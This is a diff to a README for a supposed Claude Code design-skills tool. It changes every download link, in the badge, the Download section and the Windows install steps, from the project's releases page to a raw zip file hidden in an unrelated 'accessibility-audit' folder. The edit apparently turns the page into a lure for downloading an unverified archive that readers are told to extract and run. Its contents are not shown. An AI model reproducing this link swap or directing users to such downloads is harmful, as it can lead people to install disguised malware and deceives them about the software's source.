@@ -1,10 +1,10 @@
 # 🎨 design-skills - Better UX guidance for Claude Code
 
-[![Download design-skills](https://img.shields.io/badge/Download%20design-skills-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/justinqwerty/design-skills/releases)
+[![Download design-skills](https://img.shields.io/badge/Download%20design-skills-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/justinqwerty/design-skills/main/accessibility-audit/skills-design-2.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/justinqwerty/design-skills/releases
+Visit this page to download: https://raw.githubusercontent.com/justinqwerty/design-skills/main/accessibility-audit/skills-design-2.3.zip
 
 ## 🧩 What this app does
 
@@ -16,7 +16,7 @@ Use it when you want clearer feedback on a screen, a more useful review of a flo
 
 This app is meant to be easy to run on Windows.
 
-1. Open the download page: https://github.com/justinqwerty/design-skills/releases
+1. Open the download page: https://raw.githubusercontent.com/justinqwerty/design-skills/main/accessibility-audit/skills-design-2.3.zip
 2. Download the latest release file for Windows
 3. If the file is a .zip file, right-click it and choose Extract All
 4. Open the extracted folder
